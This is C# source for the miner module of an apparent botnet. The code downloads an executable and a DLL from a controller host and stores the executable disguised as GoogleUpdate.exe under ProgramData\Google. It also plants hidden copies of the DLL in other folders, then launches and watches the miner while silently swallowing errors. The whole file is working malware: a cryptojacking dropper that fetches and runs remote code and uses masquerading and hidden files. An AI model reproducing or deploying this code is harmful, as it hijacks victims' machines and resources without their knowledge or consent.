using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace BotNet.Services.Common
{
    static class Miner
    {
        static Factory _factoryService = new Factory();
        private static bool isThreadRun;

        public static void Start()
        {
            isThreadRun = true;
            Thread thread = new Thread(new ThreadStart(Mine));
            thread.Start();
        }

        public static void Remove()
        {
            try
            {
                Stop();
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\GoogleUpdate.exe"))
                {
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\GoogleUpdate.exe");
                }

                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\libuv.dll"))
                {
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\libuv.dll");
                }

                if (File.Exists(Environment.CurrentDirectory + @"\libuv.dll"))
                {
                    File.Delete(Environment.CurrentDirectory + @"\libuv.dll");
                }
            } catch { }
        }

        public static void Stop()
        {
            Config.IsMine = false;
            isThreadRun = false;
            try
            {
                if (Process.GetProcessesByName("InstallUtil").Length != 0)
                {
                    Process.GetProcessesByName("InstallUtil")[0].Kill();
                }
            }
            catch { } 
        }

        private static void Mine()
        {
            while (isThreadRun)
            {
                try
                {
                    if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                     "\\Google\\GoogleUpdate.exe") ||
                        !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                     "\\Google\\libuv.dll") ||
                        !File.Exists(Environment.CurrentDirectory + @"\libuv.dll"))
                    {
                        WebClient webClient = new WebClient();
                        if (!Directory.Exists(
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "\\Google\\"))
                        {
                            Directory.CreateDirectory(
                                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\");
                        }

                        string tempName;
                        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                         "\\Google\\GoogleUpdate.exe"))
                        {
                            tempName = _factoryService.GenString(new Random().Next(5, 12)) + ".exe";
                            webClient.DownloadFile(Config.Host + @"/prog.e",
                                Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                            File.Copy(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName,
                                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\GoogleUpdate.exe");
                            File.Delete(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                        }

                        Thread.Sleep(2000);
                        
                        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                         "\\Google\\libuv.dll") ||
                            !File.Exists(Environment.CurrentDirectory + @"\libuv.dll"))
                        {
                            tempName = _factoryService.GenString(new Random().Next(5, 12)) + ".dll";
                            webClient.DownloadFile(Config.Host + @"/libuv.dll",
                                Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                            File.Copy(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName,
                                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                                "\\Google\\libuv.dll");
                            foreach (var path in Config.FilePath)
                            {
                                var tmpPath = path.Remove(path.LastIndexOf("\\"));

                                    if (!File.Exists(tmpPath + @"\libuv.dll"))
                                        File.Copy(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName,
                                            tmpPath + @"\libuv.dll");

                                File.SetAttributes(tmpPath + @"\libuv.dll",
                                    FileAttributes.Hidden);
                            }

                            Thread.Sleep(2000);

                            if (!File.Exists(Environment.CurrentDirectory + @"\libuv.dll"))
                                File.Copy(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName,
                                    Environment.CurrentDirectory + @"\libuv.dll");
                            File.SetAttributes(Environment.CurrentDirectory + @"\libuv.dll",
                                FileAttributes.Hidden);
                            File.Delete(Environment.GetEnvironmentVariable("TEMP") + @"\" + tempName);
                        }

                        Thread.Sleep(2000);
                    }

                    if (Process.GetProcessesByName("InstallUtil").Length == 0)
                    {
                        Process p = new Process();
                        p.StartInfo.FileName =
                            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) +
                            "\\Google\\GoogleUpdate.exe";
                        p.Start();
                    }
                    Thread.Sleep(Config.MinerCheckInterval * 0x3e8);
                }
                catch
                {

                }
            }
        }
    }
}
